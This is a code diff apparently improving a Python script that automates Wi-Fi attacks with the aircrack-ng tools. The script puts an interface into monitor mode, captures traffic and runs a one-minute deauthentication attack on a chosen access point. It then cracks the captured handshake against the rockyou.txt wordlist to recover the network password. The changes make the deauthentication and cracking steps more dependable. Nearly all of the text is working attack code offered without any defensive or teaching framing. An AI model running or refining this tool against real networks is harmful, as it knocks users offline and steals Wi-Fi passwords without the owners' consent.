@@ -10,7 +10,6 @@ from datetime import datetime
 
 active_wireless_networks = []
 
-
 def check_for_essid(essid, lst):
     if len(lst) == 0:
         return True
@@ -18,7 +17,6 @@ def check_for_essid(essid, lst):
         if essid in item["ESSID"]:
             return False
     return True
-
 
 def list_wifi_interfaces():
     """List all Wi-Fi interfaces including those in monitor mode."""
@@ -33,18 +31,17 @@ def list_wifi_interfaces():
         print(f"Error detecting Wi-Fi interfaces: {e}")
     return interfaces
 
-
 if not 'SUDO_UID' in os.environ.keys():
     print("Run this program with sudo.")
     exit()
 
-# Backup existing CSV files
+# Backup existing CSV and CAP files
 for file_name in os.listdir():
-    if ".csv" in file_name:
+    if file_name.endswith(".csv") or file_name.endswith(".cap"):
         directory = os.getcwd()
         try:
             os.mkdir(directory + "/backup/")
-        except:
+        except FileExistsError:
             pass
         timestamp = datetime.now()
         shutil.move(file_name, f"{directory}/backup/{timestamp}-{file_name}")
@@ -76,7 +73,6 @@ if not hacknic.endswith("mon"):
     subprocess.run(["sudo", "airmon-ng", "check", "kill"])
     print(f"Putting {hacknic} into monitor mode...")
     subprocess.run(["sudo", "airmon-ng", "start", hacknic])
-    hacknic += "mon"
 
 # Discover access points
 discover_access_points = subprocess.Popen(
@@ -140,15 +136,20 @@ airodump_process = subprocess.Popen(
 time.sleep(5)  # Let airodump collect initial data
 
 print("Launching de-authentication attack for 1 minute...")
-subprocess.Popen(
-    [
-        "x-terminal-emulator", "-e",
-        f"bash -c 'sudo aireplay-ng --deauth 0 -a {hackbssid} {hacknic}; exec bash'"
-    ]
+deauth_process = subprocess.Popen(
+    ["sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic]
 )
 
-time.sleep(60)  # Allow de-auth attack to persist for 1 minute
+# Allow de-auth attack to persist for 1 minute
+try:
+    time.sleep(60)
+finally:
+    deauth_process.terminate()
+    deauth_process.wait()
+    print("De-authentication attack stopped.")
+
 airodump_process.terminate()
+airodump_process.wait()
 
 if attack_choice == "1":
     print("De-authentication attack completed. Exiting program.")
@@ -161,7 +162,14 @@ if not os.path.exists(wordlist_path):
     print(f"Wordlist not found at {wordlist_path}. Please ensure rockyou.txt is available.")
     exit()
 
-aircrack_command = ["sudo", "aircrack-ng", "-w", wordlist_path, "file-01.cap"]
+cap_files = [f for f in os.listdir() if f.endswith(".cap")]
+if not cap_files:
+    print("No .cap file found. Ensure airodump-ng has captured data.")
+    exit()
+
+cap_file = cap_files[0]  # Select the first .cap file
+
+aircrack_command = ["sudo", "aircrack-ng", "-w", wordlist_path, cap_file]
 aircrack_result = subprocess.run(aircrack_command, capture_output=True, text=True)
 
 # Extract and display password if found
